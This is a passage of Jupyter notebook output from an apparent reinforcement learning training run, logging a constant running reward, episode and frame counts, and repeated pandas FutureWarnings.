      "Running reward: 11.00\t Episode 551\t Frame count: 318400\t Context: 1\n",
      "Running reward: 11.00\t Episode 551\t Frame count: 318500\t Context: 1\n",
      "Running reward: 11.00\t Episode 551\t Frame count: 318600\t Context: 1\n",
      "Running reward: 11.00\t Episode 551\t Frame count: 318700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 551\t Frame count: 318800\t Context: 1\n",
      "Running reward: 11.00\t Episode 551\t Frame count: 318900\t Context: 1\n",
      "Running reward: 11.00\t Episode 551\t Frame count: 319000\t Context: 1\n",
      "Running reward: 11.00\t Episode 551\t Frame count: 319100\t Context: 1\n",
      "Running reward: 11.00\t Episode 551\t Frame count: 319200\t Context: 1\n",
      "Running reward: 11.00\t Episode 551\t Frame count: 319300\t Context: 1\n",
      "Running reward: 11.00\t Episode 551\t Frame count: 319400\t Context: 1\n",
      "Running reward: 11.00\t Episode 551\t Frame count: 319500\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 551\t Frame count: 319600\t Context: 1\n",
      "Running reward: 11.00\t Episode 551\t Frame count: 319700\t Context: 1\n",
      "Running reward: 11.00\t Episode 551\t Frame count: 319800\t Context: 2\n",
      "Running reward: 11.00\t Episode 551\t Frame count: 319900\t Context: 2\n",
      "Running reward: 11.00\t Episode 552\t Frame count: 320000\t Context: 1\n",
      "Running reward: 11.00\t Episode 552\t Frame count: 320100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 552\t Frame count: 320200\t Context: 1\n",
      "Running reward: 11.00\t Episode 552\t Frame count: 320300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 552\t Frame count: 320400\t Context: 1\n",
      "Running reward: 11.00\t Episode 552\t Frame count: 320500\t Context: 1\n",
      "Running reward: 11.00\t Episode 552\t Frame count: 320600\t Context: 1\n",
      "Running reward: 11.00\t Episode 552\t Frame count: 320700\t Context: 2\n",
      "Running reward: 11.00\t Episode 552\t Frame count: 320800\t Context: 2\n",
      "Running reward: 11.00\t Episode 552\t Frame count: 320900\t Context: 2\n",
      "Running reward: 11.00\t Episode 552\t Frame count: 321000\t Context: 2\n",
      "Running reward: 11.00\t Episode 552\t Frame count: 321100\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 552\t Frame count: 321200\t Context: 2\n",
      "Running reward: 11.00\t Episode 552\t Frame count: 321300\t Context: 2\n",
      "Running reward: 11.00\t Episode 552\t Frame count: 321400\t Context: 2\n",
      "Running reward: 11.00\t Episode 552\t Frame count: 321500\t Context: 2\n",
      "Running reward: 11.00\t Episode 552\t Frame count: 321600\t Context: 2\n",
      "Running reward: 11.00\t Episode 553\t Frame count: 321700\t Context: 1\n",
      "Running reward: 11.00\t Episode 553\t Frame count: 321800\t Context: 1\n",
      "Running reward: 11.00\t Episode 553\t Frame count: 321900\t Context: 2\n",
      "Running reward: 11.00\t Episode 553\t Frame count: 322000\t Context: 2\n",
      "Running reward: 11.00\t Episode 553\t Frame count: 322100\t Context: 2\n",
      "Running reward: 11.00\t Episode 553\t Frame count: 322200\t Context: 2\n",
      "Running reward: 11.00\t Episode 553\t Frame count: 322300\t Context: 2\n",
      "Running reward: 11.00\t Episode 554\t Frame count: 322400\t Context: 1\n",
      "Running reward: 11.00\t Episode 554\t Frame count: 322500\t Context: 1\n",
      "Running reward: 11.00\t Episode 554\t Frame count: 322600\t Context: 1\n",
      "Running reward: 11.00\t Episode 554\t Frame count: 322700\t Context: 1\n",
      "Running reward: 11.00\t Episode 554\t Frame count: 322800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 554\t Frame count: 322900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 554\t Frame count: 323000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 554\t Frame count: 323100\t Context: 1\n",
      "Running reward: 11.00\t Episode 554\t Frame count: 323200\t Context: 1\n",
      "Running reward: 11.00\t Episode 554\t Frame count: 323300\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 554\t Frame count: 323400\t Context: 2\n",
      "Running reward: 11.00\t Episode 554\t Frame count: 323500\t Context: 2\n",
      "Running reward: 11.00\t Episode 554\t Frame count: 323600\t Context: 2\n",
      "Running reward: 11.00\t Episode 554\t Frame count: 323700\t Context: 2\n",
      "Running reward: 11.00\t Episode 555\t Frame count: 323800\t Context: 1\n",
      "Running reward: 11.00\t Episode 555\t Frame count: 323900\t Context: 1\n",
      "Running reward: 11.00\t Episode 555\t Frame count: 324000\t Context: 1\n",
      "Running reward: 11.00\t Episode 555\t Frame count: 324100\t Context: 1\n",
      "Running reward: 11.00\t Episode 555\t Frame count: 324200\t Context: 1\n",
      "Running reward: 11.00\t Episode 555\t Frame count: 324300\t Context: 2\n",
      "Running reward: 11.00\t Episode 555\t Frame count: 324400\t Context: 2\n",
      "Running reward: 11.00\t Episode 556\t Frame count: 324500\t Context: 1\n",
      "Running reward: 11.00\t Episode 556\t Frame count: 324600\t Context: 1\n",
      "Running reward: 11.00\t Episode 557\t Frame count: 324700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 557\t Frame count: 324800\t Context: 1\n",
      "Running reward: 11.00\t Episode 557\t Frame count: 324900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 557\t Frame count: 325000\t Context: 2\n",
      "Running reward: 11.00\t Episode 557\t Frame count: 325100\t Context: 2\n",
      "Running reward: 11.00\t Episode 557\t Frame count: 325200\t Context: 2\n",
      "Running reward: 11.00\t Episode 557\t Frame count: 325300\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 557\t Frame count: 325400\t Context: 2\n",
      "Running reward: 11.00\t Episode 558\t Frame count: 325500\t Context: 1\n",
      "Running reward: 11.00\t Episode 558\t Frame count: 325600\t Context: 1\n",
      "Running reward: 11.00\t Episode 559\t Frame count: 325700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 559\t Frame count: 325800\t Context: 1\n",
      "Running reward: 11.00\t Episode 559\t Frame count: 325900\t Context: 1\n",
      "Running reward: 11.00\t Episode 559\t Frame count: 326000\t Context: 2\n",
      "Running reward: 11.00\t Episode 559\t Frame count: 326100\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 559\t Frame count: 326200\t Context: 2\n",
      "Running reward: 11.00\t Episode 559\t Frame count: 326300\t Context: 2\n",
      "Running reward: 11.00\t Episode 560\t Frame count: 326400\t Context: 2\n",
      "Running reward: 11.00\t Episode 560\t Frame count: 326500\t Context: 2\n",
      "Running reward: 11.00\t Episode 560\t Frame count: 326600\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 560\t Frame count: 326700\t Context: 2\n",
      "Running reward: 11.00\t Episode 560\t Frame count: 326800\t Context: 2\n",
      "Running reward: 11.00\t Episode 561\t Frame count: 326900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 561\t Frame count: 327000\t Context: 2\n",
      "Running reward: 11.00\t Episode 561\t Frame count: 327100\t Context: 2\n",
      "Running reward: 11.00\t Episode 561\t Frame count: 327200\t Context: 2\n",
      "Running reward: 11.00\t Episode 561\t Frame count: 327300\t Context: 2\n",
      "Running reward: 11.00\t Episode 561\t Frame count: 327400\t Context: 2\n",
      "Running reward: 11.00\t Episode 561\t Frame count: 327500\t Context: 2\n",
      "Running reward: 11.00\t Episode 561\t Frame count: 327600\t Context: 2\n",
      "Running reward: 11.00\t Episode 562\t Frame count: 327700\t Context: 1\n",
      "Running reward: 11.00\t Episode 562\t Frame count: 327800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 562\t Frame count: 327900\t Context: 1\n",
      "Running reward: 11.00\t Episode 562\t Frame count: 328000\t Context: 1\n",
      "Running reward: 11.00\t Episode 562\t Frame count: 328100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 562\t Frame count: 328200\t Context: 1\n",
      "Running reward: 11.00\t Episode 562\t Frame count: 328300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 562\t Frame count: 328400\t Context: 2\n",
      "Running reward: 11.00\t Episode 562\t Frame count: 328500\t Context: 2\n",
      "Running reward: 11.00\t Episode 562\t Frame count: 328600\t Context: 2\n",
      "Running reward: 11.00\t Episode 562\t Frame count: 328700\t Context: 2\n",
      "Running reward: 11.00\t Episode 562\t Frame count: 328800\t Context: 2\n",
      "Running reward: 11.00\t Episode 562\t Frame count: 328900\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 562\t Frame count: 329000\t Context: 2\n",
      "Running reward: 11.00\t Episode 563\t Frame count: 329100\t Context: 1\n",
      "Running reward: 11.00\t Episode 563\t Frame count: 329200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 563\t Frame count: 329300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 563\t Frame count: 329400\t Context: 2\n",
      "Running reward: 11.00\t Episode 564\t Frame count: 329500\t Context: 1\n",
      "Running reward: 11.00\t Episode 564\t Frame count: 329600\t Context: 1\n",
      "Running reward: 11.00\t Episode 564\t Frame count: 329700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 564\t Frame count: 329800\t Context: 1\n",
      "Running reward: 11.00\t Episode 564\t Frame count: 329900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 564\t Frame count: 330000\t Context: 1\n",
      "Running reward: 11.00\t Episode 564\t Frame count: 330100\t Context: 2\n",
      "Running reward: 11.00\t Episode 564\t Frame count: 330200\t Context: 2\n",
      "Running reward: 11.00\t Episode 564\t Frame count: 330300\t Context: 2\n",
      "Running reward: 11.00\t Episode 564\t Frame count: 330400\t Context: 2\n",
      "Running reward: 11.00\t Episode 564\t Frame count: 330500\t Context: 2\n",
      "Running reward: 11.00\t Episode 564\t Frame count: 330600\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 564\t Frame count: 330700\t Context: 2\n",
      "Running reward: 11.00\t Episode 564\t Frame count: 330800\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 564\t Frame count: 330900\t Context: 2\n",
      "Running reward: 11.00\t Episode 564\t Frame count: 331000\t Context: 2\n",
      "Running reward: 11.00\t Episode 564\t Frame count: 331100\t Context: 2\n",
      "Running reward: 11.00\t Episode 565\t Frame count: 331200\t Context: 1\n",
      "Running reward: 11.00\t Episode 565\t Frame count: 331300\t Context: 1\n",
      "Running reward: 11.00\t Episode 565\t Frame count: 331400\t Context: 1\n",
      "Running reward: 11.00\t Episode 566\t Frame count: 331500\t Context: 1\n",
      "Running reward: 11.00\t Episode 566\t Frame count: 331600\t Context: 1\n",
      "Running reward: 11.00\t Episode 566\t Frame count: 331700\t Context: 1\n",
      "Running reward: 11.00\t Episode 566\t Frame count: 331800\t Context: 1\n",
      "Running reward: 11.00\t Episode 566\t Frame count: 331900\t Context: 2\n",
      "Running reward: 11.00\t Episode 566\t Frame count: 332000\t Context: 2\n",
      "Running reward: 11.00\t Episode 566\t Frame count: 332100\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 566\t Frame count: 332200\t Context: 2\n",
      "Running reward: 11.00\t Episode 566\t Frame count: 332300\t Context: 2\n",
      "Running reward: 11.00\t Episode 566\t Frame count: 332400\t Context: 2\n",
      "Running reward: 11.00\t Episode 566\t Frame count: 332500\t Context: 2\n",
      "Running reward: 11.00\t Episode 566\t Frame count: 332600\t Context: 2\n",
      "Running reward: 11.00\t Episode 567\t Frame count: 332700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 567\t Frame count: 332800\t Context: 1\n",
      "Running reward: 11.00\t Episode 567\t Frame count: 332900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 567\t Frame count: 333000\t Context: 1\n",
      "Running reward: 11.00\t Episode 567\t Frame count: 333100\t Context: 1\n",
      "Running reward: 11.00\t Episode 567\t Frame count: 333200\t Context: 2\n",
      "Running reward: 11.00\t Episode 567\t Frame count: 333300\t Context: 2\n",
      "Running reward: 11.00\t Episode 567\t Frame count: 333400\t Context: 2\n",
      "Running reward: 11.00\t Episode 567\t Frame count: 333500\t Context: 2\n",
      "Running reward: 11.00\t Episode 567\t Frame count: 333600\t Context: 2\n",
      "Running reward: 11.00\t Episode 567\t Frame count: 333700\t Context: 2\n",
      "Running reward: 11.00\t Episode 567\t Frame count: 333800\t Context: 2\n",
      "Running reward: 11.00\t Episode 568\t Frame count: 333900\t Context: 1\n",
      "Running reward: 11.00\t Episode 568\t Frame count: 334000\t Context: 1\n",
      "Running reward: 11.00\t Episode 568\t Frame count: 334100\t Context: 2\n",
      "Running reward: 11.00\t Episode 568\t Frame count: 334200\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 569\t Frame count: 334300\t Context: 1\n",
      "Running reward: 11.00\t Episode 569\t Frame count: 334400\t Context: 1\n",
      "Running reward: 11.00\t Episode 570\t Frame count: 334500\t Context: 1\n",
      "Running reward: 11.00\t Episode 570\t Frame count: 334600\t Context: 1\n",
      "Running reward: 11.00\t Episode 570\t Frame count: 334700\t Context: 1\n",
      "Running reward: 11.00\t Episode 570\t Frame count: 334800\t Context: 1\n",
      "Running reward: 11.00\t Episode 570\t Frame count: 334900\t Context: 1\n",
      "Running reward: 11.00\t Episode 570\t Frame count: 335000\t Context: 1\n",
      "Running reward: 11.00\t Episode 570\t Frame count: 335100\t Context: 1\n",
      "Running reward: 11.00\t Episode 570\t Frame count: 335200\t Context: 1\n",
      "Running reward: 11.00\t Episode 570\t Frame count: 335300\t Context: 1\n",
      "Running reward: 11.00\t Episode 570\t Frame count: 335400\t Context: 1\n",
      "Running reward: 11.00\t Episode 570\t Frame count: 335500\t Context: 2\n",
      "Running reward: 11.00\t Episode 570\t Frame count: 335600\t Context: 2\n",
      "Running reward: 11.00\t Episode 570\t Frame count: 335700\t Context: 2\n",
      "Running reward: 11.00\t Episode 570\t Frame count: 335800\t Context: 2\n",
      "Running reward: 11.00\t Episode 570\t Frame count: 335900\t Context: 2\n",
      "Running reward: 11.00\t Episode 571\t Frame count: 336000\t Context: 1\n",
      "Running reward: 11.00\t Episode 571\t Frame count: 336100\t Context: 1\n",
      "Running reward: 11.00\t Episode 571\t Frame count: 336200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 571\t Frame count: 336300\t Context: 1\n",
      "Running reward: 11.00\t Episode 571\t Frame count: 336400\t Context: 1\n",
      "Running reward: 11.00\t Episode 572\t Frame count: 336500\t Context: 1\n",
      "Running reward: 11.00\t Episode 572\t Frame count: 336600\t Context: 1\n",
      "Running reward: 11.00\t Episode 572\t Frame count: 336700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 572\t Frame count: 336800\t Context: 1\n",
      "Running reward: 11.00\t Episode 572\t Frame count: 336900\t Context: 1\n",
      "Running reward: 11.00\t Episode 572\t Frame count: 337000\t Context: 1\n",
      "Running reward: 11.00\t Episode 572\t Frame count: 337100\t Context: 1\n",
      "Running reward: 11.00\t Episode 572\t Frame count: 337200\t Context: 1\n",
      "Running reward: 11.00\t Episode 572\t Frame count: 337300\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 572\t Frame count: 337400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 573\t Frame count: 337500\t Context: 1\n",
      "Running reward: 11.00\t Episode 573\t Frame count: 337600\t Context: 1\n",
      "Running reward: 11.00\t Episode 573\t Frame count: 337700\t Context: 1\n",
      "Running reward: 11.00\t Episode 573\t Frame count: 337800\t Context: 2\n",
      "Running reward: 11.00\t Episode 574\t Frame count: 337900\t Context: 1\n",
